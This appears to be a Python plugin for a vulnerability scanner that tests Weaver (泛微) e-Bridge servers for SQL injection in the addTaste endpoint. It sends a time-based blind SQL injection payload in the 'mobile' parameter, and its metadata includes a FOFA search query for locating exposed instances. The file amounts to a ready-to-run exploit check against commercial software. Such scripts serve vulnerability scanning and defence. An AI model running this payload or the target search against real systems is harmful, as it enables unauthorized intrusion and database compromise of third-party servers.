#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/nSKkhiayFLy-JyagOiKjpA',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '泛微云桥 e-Bridge addTaste接口存在sql注入',

      'level'     :   'high',

      'FOFA'      :   'app="泛微-云桥e-Bridge"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/4/8',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP(5-(IF(18015%3e3469,0,4)))))mKjk)%20OR%20%27KQZm%27=%27REcX'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=10,verify=False)
    if res.status_code == 200 and 'xiangyuan_imuseragent' in res.text and '添加体验账号程序异常，请联系管理员' in res.text:
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret